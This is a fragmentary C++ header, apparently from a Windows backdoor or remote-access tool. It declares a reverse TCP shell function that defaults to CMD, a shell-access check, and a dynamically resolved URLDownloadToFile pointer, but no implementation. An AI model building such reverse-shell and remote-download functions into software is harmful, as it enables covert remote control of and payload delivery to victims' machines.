...
bool IsShellAccessible(bool output = true);

void Clear(bool pause = false);
...
typedef int(__stdcall* MyURLDownloadToFile)(LPUNKNOWN, LPCTSTR, LPCTSTR, DWORD, LPBINDSTATUSCALLBACK);
...
bool ReverseTCP(std::string ip, int port, std::string args = "CMD");
